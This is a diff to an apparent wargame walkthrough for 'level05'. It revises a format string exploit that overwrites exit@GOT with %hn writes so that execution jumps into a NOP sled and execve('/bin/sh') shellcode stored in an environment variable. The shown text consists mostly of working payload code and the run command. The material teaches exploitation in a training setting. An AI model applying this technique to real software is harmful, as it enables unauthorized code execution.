@@ -99,8 +99,10 @@ export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x
 ```
 
 **Shellcode breakdown:**
-- 200 NOPs (`\x90`) - NOP sled for reliability
+- 200 NOPs (`\x90`) - Landing zone for address variations
 - 23 bytes of shellcode - `execve("/bin/sh", NULL, NULL)`
+
+**Why 200 NOPs?** GDB addresses ≠ runtime addresses. Targeting the middle of the NOP sled provides ±100 bytes tolerance for address shifts.
 
 ## 9. Find shellcode address in memory
 
@@ -113,21 +115,33 @@ gdb ./level05
 
 Look for the `SHELLCODE=` string and note the address. From testing:
 - Environment variable starts at: `0xffffdd28`
-- Shellcode (after NOPs) at: `0xffffddf0`
+
+**Calculate middle of NOP sled:**
+
+```
+0xffffdd28 + 10 ("SHELLCODE=") + 100 (half of NOPs) = 0xffffdd96
+```
+
+Targeting the middle provides ±100 bytes tolerance for address variations.
 
 **Address verification:**
-- `0xff` ✅ Safe (not in uppercase range)
-- `0xdd` ✅ Safe
-- `0xf0` ✅ Safe
+- `0xff` `0xff` `0xdd` `0x96` ✅ No uppercase bytes (0x41-0x5A)
 
 ## 10. Calculate format string payload
 
-**Goal:** Overwrite `exit@GOT` (`0x080497e0`) with shellcode address (`0xffffddf0`)
+**Goal:** Overwrite `exit@GOT` (`0x080497e0`) with shellcode address (`0xffffdd96`)
 
 **Using short writes (`%hn` - 2 bytes at a time):**
 
+**Target address breakdown:**
+```
+0xffffdd96 split into two 2-byte writes:
+  Lower 2 bytes: 0xdd96 = 56726 (decimal)
+  Upper 2 bytes: 0xffff = 65535 (decimal)
+```
+
 Write to two addresses:
-- `0x080497e0` ← write `0xddf0` (56816 decimal)
+- `0x080497e0` ← write `0xdd96` (56726 decimal)
 - `0x080497e2` ← write `0xffff` (65535 decimal)
 
 **Payload structure:**
@@ -136,11 +150,11 @@ Write to two addresses:
 ```
 
 **Calculation:**
-- Addresses: 8 bytes
-- Need to print 56816 total bytes: `56816 - 8 = 56808`
-- Then write to position 10 (first address)
-- Need to print 65535 total bytes: `65535 - 56816 = 8719`
-- Then write to position 11 (second address)
+- Addresses: 8 bytes already written
+- Need to print 56726 total bytes: `56726 - 8 = 56718`
+- Then write to position 10 with `%10$hn` (writes lower 2 bytes)
+- Need to print 65535 total bytes: `65535 - 56726 = 8809`
+- Then write to position 11 with `%11$hn` (writes upper 2 bytes)
 
 ## 11. Construct the exploit
 
@@ -149,9 +163,9 @@ import struct
 
 payload = struct.pack("<I", 0x080497e0)    # exit@GOT
 payload += struct.pack("<I", 0x080497e2)   # exit@GOT+2
-payload += "%56808x"                       # Pad to 56816 bytes
-payload += "%10$hn"                        # Write 0xddf0 to exit@GOT
-payload += "%8719x"                        # Pad to 65535 bytes
+payload += "%56718x"                       # Pad to 56726 bytes
+payload += "%10$hn"                        # Write 0xdd96 to exit@GOT
+payload += "%8809x"                        # Pad to 65535 bytes
 payload += "%11$hn"                        # Write 0xffff to exit@GOT+2
 ```
 
@@ -162,7 +176,7 @@ payload += "%11$hn"                        # Write 0xffff to exit@GOT+2
 export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 
 # Run exploit
-(python -c 'import struct; print struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%56808x%10$hn%8719x%11$hn"'; cat) | ./level05
+(python -c 'import struct; print struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%56718x%10$hn%8809x%11$hn"'; cat) | ./level05
 ```
 
 **Output:**
